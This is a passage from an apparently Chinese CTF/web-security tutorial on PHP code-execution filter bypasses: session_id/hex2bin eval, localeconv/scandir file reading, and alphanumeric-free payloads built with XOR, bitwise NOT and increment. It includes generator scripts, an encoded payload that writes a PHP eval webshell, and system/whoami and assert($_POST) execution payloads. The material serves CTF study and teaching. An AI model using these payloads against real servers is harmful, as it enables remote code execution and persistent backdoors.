title="session_id()"></a>session_id()</h4><p>session_id()函数用于返回当前会话PHPSESSID的值，当然需要先执行session_start()来开启session。</p><p>然后我们在PHPSESSID中写入恶意代码就可以被获取到并执行。</p><p>但要注意PHPSESSID只允许[A-Za-z0-9]，因此我们还要将恶意代码转换成16进制再用hex2bin解码。</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs leaf">赋值PHPSESSID=706870696e666f28293b  <span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">phpinfo</span><span class="hljs-params">()</span></span>;<br>code=eval(hex2bin(session_id(session_start())))<br></code></pre></td></tr></table></figure><h4 id="PHP函数直接读文件"><a href="#PHP函数直接读文件" class="headerlink" title="PHP函数直接读文件"></a>PHP函数直接读文件</h4><p>以一道题目为例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/data:\/\/&#124;filter:\/\/&#124;php:\/\/&#124;phar:\/\//i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/et&#124;na&#124;info&#124;dec&#124;bin&#124;hex&#124;oct&#124;pi&#124;log/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>                <span class="hljs-comment">// echo $_GET[&#x27;exp&#x27;];</span><br>                @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还差一点哦！&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;再好好想想！&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还想读flag，臭弟弟！&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>根据过滤来看前面三种都不能用了，因此要换个思路。</p><blockquote><p>localeconv():返回一个包含本地数字及货币格式信息的数组，重点在于<strong>返回数组第一个元素是 <code> .</code></strong> ，因此我们用current取出<code>.</code>来读取当前目录。</p><p>scandir():列出目录中的文件和目录</p><p>pos():和current()一样输出数组中当前元素的值。</p><p>关于数组操作还有一些函数：</p><ul><li><a href="https://www.php.net/manual/zh/function.end.php">end()</a> - 将数组的内部指针指向最后一个单元</li><li><a href="https://www.php.net/manual/zh/function.key.php">key()</a> - 从关联数组中取得键名</li><li><a href="https://www.php.net/manual/zh/function.each.php">each()</a> - 返回数组中当前的键／值对并将数组指针向前移动一步</li><li><a href="https://www.php.net/manual/zh/function.prev.php">prev()</a> - 将数组的内部指针倒回一位</li><li><a href="https://www.php.net/manual/zh/function.reset.php">reset()</a> - 将数组的内部指针指向第一个单元</li><li><a href="https://www.php.net/manual/zh/function.next.php">next()</a> - 将数组中的内部指针向前移动一位</li></ul><p>chdir():用于跳出目录，比如进入上一层目录就需要chdir(“..”)</p><p>array_reverse():翻转数组，有时候需要的元素太靠后可以用它。</p></blockquote><p>我们据此构造出payload:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">exp=print<span class="hljs-constructor">_r(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>))) <span class="hljs-comment">//打印当前目录下的文件</span><br>exp=print<span class="hljs-constructor">_r(<span class="hljs-params">next</span>(<span class="hljs-params">array_reverse</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>))))) <span class="hljs-comment">//获取倒数第二个文件名</span><br>exp=highlight<span class="hljs-constructor">_file(<span class="hljs-params">next</span>(<span class="hljs-params">array_reverse</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>)))))  <span class="hljs-comment">//读取文件内容</span><br></code></pre></td></tr></table></figure><h3 id="7-无字母无数字"><a href="#7-无字母无数字" class="headerlink" title="7.无字母无数字"></a>7.无字母无数字</h3><h4 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h4><p>以下面这段代码为例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9]&#124;[a-z]&#124;\`&#124;\+&#124;\~&#124;\$&#124;\[&#124;\]&#124;\&#123;&#124;\&#125;&#124;\&amp;&#124;\-/i&#x27;</span>, <span class="hljs-variable">$c</span>)) &#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo(<span class="hljs-subst">$c</span>);&quot;</span>);<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>  &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>过滤了绝大多数字符，但我们可以<strong>使用没有被过滤的字符两两异或</strong>来获取被过滤的字符。贴个羽师傅的脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//异</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*author yu22x*/</span><br><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;xor_rce.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123; <br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123; <br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br><span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br><span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>&#125;<br><span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="hljs-comment">//根据题目给的正则表达式修改即可</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))&#124;&#124;<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>  <br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br><span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)^<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br><span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<br>&#125;<br>&#125;<br><br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//或</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/* author yu22x */</span><br><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;or_rce.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123; <br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123; <br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br><span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br><span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>&#125;<br><span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[0-9a-z]/i&#x27;</span>;<span class="hljs-comment">//根据题目给的正则表达式修改即可</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))&#124;&#124;<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>  <br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br><span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)&#124;<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br><span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<br>&#125;<br>&#125;<br><br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后再将需要的命令拼接出来即可。</p><p>例如：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">shell=<span class="hljs-variable">$_</span>=(<span class="hljs-string">&#x27;%01&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%13&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%13&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%05&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%12&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%14&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>); <span class="hljs-regexp">//</span> <span class="hljs-variable">$_</span>=<span class="hljs-string">&#x27;assert&#x27;</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-string">&#x27;_&#x27;</span>.(<span class="hljs-string">&#x27;%0D&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%2F&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%0E&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%09&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>); <span class="hljs-regexp">//</span> <span class="hljs-variable">$__</span>=<span class="hljs-string">&#x27;_POST&#x27;</span>;<br><span class="hljs-variable">$___</span>=$<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$_</span>(<span class="hljs-variable">$___</span>[_]); <span class="hljs-regexp">//</span> assert(<span class="hljs-variable">$_POST</span>[_]);<br></code></pre></td></tr></table></figure><p>执行env命令打印环境变量就有flag。</p><h4 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h4><p>和异或原理差不多，利用两个字符取反来获取想要的字符。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//在命令行中运行</span><br><br><span class="hljs-comment">/*author yu22x*/</span><br><br><span class="hljs-title function_ invoke__">fwrite</span>(STDOUT,<span class="hljs-string">&#x27;[+]your function: &#x27;</span>);<br><br><span class="hljs-variable">$system</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;\n&quot;</span>), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">fgets</span>(STDIN)); <br><br><span class="hljs-title function_ invoke__">fwrite</span>(STDOUT,<span class="hljs-string">&#x27;[+]your command: &#x27;</span>);<br><br><span class="hljs-variable">$command</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;\n&quot;</span>), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">fgets</span>(STDIN)); <br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;[*] (~&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$system</span>).<span class="hljs-string">&#x27;)(~&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$command</span>).<span class="hljs-string">&#x27;);&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>如果想使用call_user_func的话可以使用下面这段取反：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~(<span class="hljs-string">&#x27;call_user_func&#x27;</span>));<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~(<span class="hljs-string">&#x27;system&#x27;</span>));<br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~(<span class="hljs-string">&#x27;whoami&#x27;</span>));<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;(~&#x27;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&#x27;)(~&#x27;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&#x27;,~&#x27;</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&#x27;,\&#x27;\&#x27;)&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>一些常用的取反payload：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs llvm">//写马<br>//file_put_contents(&#x27;<span class="hljs-number">4</span>.php&#x27;<span class="hljs-punctuation">,</span>&#x27;&lt;?php eval(\$_POST[<span class="hljs-number">1</span>])<span class="hljs-comment">;&#x27;);</span><br>(~(<span class="hljs-variable">%99</span><span class="hljs-variable">%96</span><span class="hljs-variable">%93</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%A0</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%8</span>A<span class="hljs-variable">%8</span>B<span class="hljs-variable">%A0</span><span class="hljs-variable">%9</span>C<span class="hljs-variable">%90</span><span class="hljs-variable">%91</span><span class="hljs-variable">%8</span>B<span class="hljs-variable">%9</span>A<span class="hljs-variable">%91</span><span class="hljs-variable">%8</span>B<span class="hljs-variable">%8</span>C))(~(<span class="hljs-variable">%CB</span><span class="hljs-variable">%D1</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>F)<span class="hljs-punctuation">,</span>~(<span class="hljs-variable">%C3</span><span class="hljs-variable">%C0</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%DF</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%89</span><span class="hljs-variable">%9</span>E<span class="hljs-variable">%93</span><span class="hljs-variable">%D7</span><span class="hljs-variable">%DB</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%B0</span><span class="hljs-variable">%AC</span><span class="hljs-variable">%AB</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%CE</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%D6</span><span class="hljs-variable">%C4</span>))<span class="hljs-comment">;</span><br><span class="hljs-comment"></span><br>//命令执行<br>//(call_user_func)(system<span class="hljs-punctuation">,</span>whoami<span class="hljs-punctuation">,</span>&#x27;&#x27;)<br>(~<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>e<span class="hljs-variable">%93</span><span class="hljs-variable">%93</span><span class="hljs-variable">%a0</span><span class="hljs-variable">%8</span>a<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%99</span><span class="hljs-variable">%8</span>a<span class="hljs-variable">%91</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span>)(~<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%86</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%92</span><span class="hljs-punctuation">,</span>~<span class="hljs-variable">%88</span><span class="hljs-variable">%97</span><span class="hljs-variable">%90</span><span class="hljs-variable">%9</span>e<span class="hljs-variable">%92</span><span class="hljs-variable">%96</span><span class="hljs-punctuation">,</span>&#x27;&#x27;)<span class="hljs-comment">;</span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure><h4 id="自增-有限制"><a href="#自增-有限制" class="headerlink" title="自增(有限制)"></a>自增(有限制)</h4><p>注意是php5环境。</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>来自p牛的经典bypas，使用[]数组获取array中的第一个字符 ‘a’ ，然后通过自增去获取其它字符最终构造出webshell：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=[];<br><span class="hljs-variable">$_</span>=@<span class="hljs-string">&quot;<span class="hljs-subst">$_</span>&quot;</span>; <span class="hljs-comment">// $_=&#x27;Array&#x27;;</span><br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;@&#x27;</span>]; <span class="hljs-comment">// $_=$_[0];</span><br><span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>; <span class="hljs-comment">// A</span><br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>; <span class="hljs-comment">// S</span><br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>; <span class="hljs-comment">// S</span><br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span 